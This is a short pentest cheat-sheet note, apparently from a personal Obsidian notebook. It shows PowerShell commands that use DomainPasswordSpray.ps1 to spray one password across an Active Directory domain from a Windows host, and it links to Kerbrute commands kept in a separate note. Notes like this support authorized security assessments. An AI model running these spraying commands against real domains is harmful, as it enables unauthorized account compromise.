-- -
Password spraying attacks from a windows host. Either pivot host or if that's what they gave you for the assessment. 
### DomainPasswordSpray.ps1
```powershell
# You don't need to supply a userlist as the tool is able to auto-generate one. 

# generic 
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <passwd> -OutFile <output file> -ErrorAction SilentContinue

# specific 
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

^dd4513

### Kerbrute
You can use the same commands as in the [[Dark Arts/Passwords/Password Spray/Linux|Linux]] section:
![[Dark Arts/Passwords/Password Spray/Linux#^f1c1f5|Linux]]
